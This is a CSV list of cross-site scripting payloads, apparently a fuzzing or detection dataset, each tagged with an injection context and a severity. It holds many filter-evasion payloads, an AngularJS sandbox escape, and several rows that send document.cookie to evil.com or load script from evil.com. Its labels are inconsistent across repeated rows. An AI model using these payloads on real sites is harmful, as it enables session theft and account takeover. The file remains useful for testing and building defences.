payload,context,severity
"<iframe src=""javascript:alert(1)"">",tag_injection,high
/*alert(1)*/,tag_injection,medium
javascript:confirm(1),js_uri,medium
"setTimeout(""alert(1)"",0)",dom_sink,high
"""><svg onload=alert()>",tag_injection,medium
"<svg//onload=alert(String.fromCharCode(88,83,83))>",tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,high
onerror='alert(1)',tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<img/src=x onerror=alert(1)//>,dom_sink,high
%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E,dom_sink,low
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,high
""" OneRROR=alERt()1 a=""",attribute_escape,medium
"?alert(1)"",",tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
alert(1);,tag_injection,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
< script>d.innerHTML+='';</script>,tag_injection,high
javascript:alert(1),js_uri,medium
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
innerHTML=location.hash>#< script>alert(1)</script>,tag_injection,high
"eval(""alert(1)"")",dom_sink,medium
${alert(1)},attribute_escape,medium
<img src=x onload=alert(1)>,event_handler,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
<image src/onerror=alert(1)>,tag_injection,medium
<script>\u0061\u006cert(document.dom\u0061in)</script>,script_injection,low
<marquee onstart=alert(1)>,script_injection,high
{{7*7}},template_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
"location=""javascript:alert(1)""",attribute_escape,low
//comment%0a%0dalert(0);,tag_injection,medium
javascript:alert(document.domain),js_uri,high
<img src/onerror=prompt(8)>,tag_injection,medium
\' onerror=confirm(1)//,attribute_escape,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"\"" onerror=alert(1)//",js_uri,high
<body onload=alert(1)>,event_handler,medium
onerror=alert(0);>,tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
' ><img src=x onerror=alert(1)>,attribute_escape,high
eval(atob('YWxlcnQoKQ==')),script_injection,high
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
%20%3Cimg%20src=1%20onerror=alert(1)%3E,tag_injection,medium
onload='alert(1)',tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
%3Cscript%3Efor((TESTAnonKryptiQuz)in(self))eval(TESTAnonKryptiQuz)(`${`TESTAnonKryptiQuz`}`)%3C/script%3E,js_uri,low
{{7*7}},template_injection,low
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
"location=""javascript:confirm(1)""",js_uri,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
"onload=""alert(1)""",tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<SvG/OnLoAd=aLeRt(1)>,tag_injection,medium
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
<marquee onstart=alert(1)>,event_handler,medium
<script>alert(1)</script>,attribute_escape,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"""><script>prompt`1`)</script>",attribute_escape,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<svg id=1 onload=confirm(1)>,tag_injection,medium
javascript:confirm(1),js_uri,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
"<ScripT>alERt(sTriNg.FrOmchArcOde(88,83,83))</sCriPt>",tag_injection,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
<svg onload=confirm`1`>,attribute_escape,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
"document.body.innerHTML=""\x3cimg src=x onerror=alert(1)\x3e""",js_uri,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,high
<svg id=1 onload=confirm(1)>,tag_injection,medium
<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(6715)&gt;`>,js_uri,high
<script>prompt(1)</script>,js_uri,high
<svg onload=alert()>,attribute_escape,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"\"" onerror=alert(1)//",attribute_escape,low
alert(1),tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
<svg////////onload=alert(1)>,tag_injection,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
"""><object>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<iframe/onload=alert(0);>,tag_injection,medium
onerror=alert(0);>,tag_injection,medium
onload='alert(1)',tag_injection,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<svgonload=alert(1)>,tag_injection,medium
<script>d.innerHTML+='';</script>,tag_injection,high
<script src=//evil.com/xss.js></script>,script_injection,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
onerror=alert(0);>,tag_injection,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
javascript:alert(1),js_uri,high
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
"{{constructor.constructor(""alert(1)"")()}}",attribute_escape,low
<input onfocus=\u0061\u006cert(1) \u0061utofocus>,event_handler,high
"""></tag><svg onload=alert(1)>",tag_injection,medium
+alert(1)+,tag_injection,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
</script><svg onload=alert(1)>,tag_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
onload='alert(1)',attribute_escape,medium
javascript:al'+'ert(document.domain),js_uri,low
"<object data=""javascript:alert(1)"">",tag_injection,high
onload='alert(1)',tag_injection,medium
"<vIdeO
><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",tag_injection,high
\' onerror=alert(1)//,attribute_escape,low
""" onfocus=al'+'ert(1) autofocus=""",js_uri,medium
' onerror=alert(1) x=',attribute_escape,high
"""><svg onload=alert()>",tag_injection,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"\' onerror
=alert(	1)//",js_uri,low
{{7*7}},template_injection,low
<svg onload=alert(1)>,event_handler,medium
onerror=self.alert(1);>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"""><SvG OnlOAd=ALeRT()>",tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<SVg ONLoAD=ALERt()>,tag_injection,medium
"%3Cembed src=""javascript:alert(1)""%3E",tag_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
<img src=x onerror=alert(1)>,script_injection,low
javaSCRIPT:alert(1),js_uri,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
' \x3e\x3cimg src=x onerror=alert(1)\x3e,js_uri,high
setInterval('ale'+'rt(10)');,tag_injection,high
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,medium
javascript:alert(1),js_uri,high
onerror='alert(1)',tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",script_injection,high
<svg/onload=alert(1)>,tag_injection,medium
""" onerror=alert(1) x=""",attribute_escape,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<%= aLeRt(1) %>,template_injection,medium
<video src=x onload=alert(1)>,event_handler,medium
"onerror=""alert(1)""",tag_injection,medium
top.alert(1))</SCRIPT>,attribute_escape,high
x=1}}};alert(1)//,attribute_escape,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
?url=javscript:alert(1),tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"<script src
=//evil.com/xss.js></script>",script_injection,low
<svgonload=alert(1)>,tag_injection,medium
""" onload=alert(1) x=""",event_handler,low
jAvAsCrIpT:CoNfIrM(1),js_uri,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,attribute_escape,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"onerror=""alert(1)""",tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"""><svg alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",js_uri,high
<body onload=confirm(1)>,event_handler,medium
.alert(1);,tag_injection,medium
<script>confirm(1)</script>,script_injection,high
"""><svg onload=alert()>",tag_injection,medium
' onmouseover=alert(1) ',attribute_escape,low
<svg////////onload=alert(1)>,tag_injection,medium
; alert(1);//,attribute_escape,medium
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
<script>confirm(1)</script>,attribute_escape,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"\""><img src=x onerror=alert(1)>",attribute_escape,low
"ontouchstart=""alert(1)""",tag_injection,medium
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",event_handler,medium
<svg onload=alert(1)>,js_uri,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
<input onfocus=alert(1) autofocus>,js_uri,high
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
' onmouseover=alert(1) ',dom_sink,high
"setTimeout(""alert(1)"",0)",dom_sink,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",attribute_escape,high
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"\"" onerror=alert(1)//",attribute_escape,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"<img src
=x onerror
=alert(	1)>",tag_injection,medium
<img src=x onerror=alert(1)>,event_handler,medium
.alert(1);,tag_injection,medium
<SCrIpt>D.INNERHTml+='';</SCripT>,tag_injection,high
<svg/onload=alert(1)>,tag_injection,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
innerHTML=location.hash>#<script	>alert(1)</script>,tag_injection,high
' onerror=alert(1) x=',attribute_escape,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
<%= alert(1) %>,template_injection,high
"<svG/x="">""/oNloaD=confirm()//",attribute_escape,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
' onmouseover=confirm(1) ',attribute_escape,low
<%= confirm(1) %>,template_injection,low
<img/src=x onerror=confirm(1)//>,script_injection,low
<svg src=x onerror=alert(1)>,tag_injection,medium
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
setInterval('ale'+'rt(10)');,tag_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
alert(1);,tag_injection,medium
"%3Cscript%3Edocument.location=""http://evil.com/?c=""+document.cookie%3C/script%3E",attribute_escape,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
""" onload=alert(1) x=""",js_uri,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
"""><img src=x onerror=alert(1)>",attribute_escape,medium
-alert(1)-',tag_injection,medium
"\"" onerror=alert(1)//",attribute_escape,high
<script>prompt(1)</script>,dom_sink,medium
"location=""javascript:confirm(1)""",dom_sink,medium
alert(2),tag_injection,medium
onload='alert(1)',tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
<img/src/onerror=alert(1),tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<script src=//evil.com/xss.js></script>,template_injection,low
' onload=alert(1) x=',attribute_escape,medium
"jAvAsCrIpT:VoId(dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM"")",js_uri,medium
"""><svg
 onload=alert(1)>",tag_injection,medium
"\"" onload=alert(1)//",event_handler,high
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"{{c=%27%27.sub.call;b=%27%27.sub.bind;a=%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(%22astNode=pop();astNode.type=%27UnaryExpression%27;astNode.operator=%27(window.X?void0:(window.X=true,alert(document.domain)))+%27;astNode.argument={type:%27Identifier%27,name:%27foo%27};%22);m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=%27%27.sub;$eval(%27a(b.c)%27);[].push.apply=a;}}",js_uri,medium
<script src=//evil.com/xss.js></script>,script_injection,low
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,low
</script><svg onload=alert(1)>,tag_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
"<details open ontoggle
=alert(	1)>",event_handler,low
confirm(),tag_injection,medium
</tag><svg onload=alert(1)>,tag_injection,medium
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,low
"\"" onerror=alert(1)//",attribute_escape,low
"\""><img src=x onload=alert(1)>",attribute_escape,low
<svgonload=alert(1)>,tag_injection,medium
' onmouseover=alert(1) ',attribute_escape,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
</script><svg onload=alert(1)>,tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
#{alert(1)},template_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<img/’onerror=alert(1) src=a>,tag_injection,medium
<textarea>d.innerHTML+='';</script>,tag_injection,high
onload='confirm`1`',tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,medium
-alert(23)/,tag_injection,medium
<img src=x onerror=alert(1)>,tag_injection,high
"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
"""><svg onload=alert(1)>",tag_injection,medium
javascript:confirm`1`,js_uri,medium
<svg onload=alert()>,tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
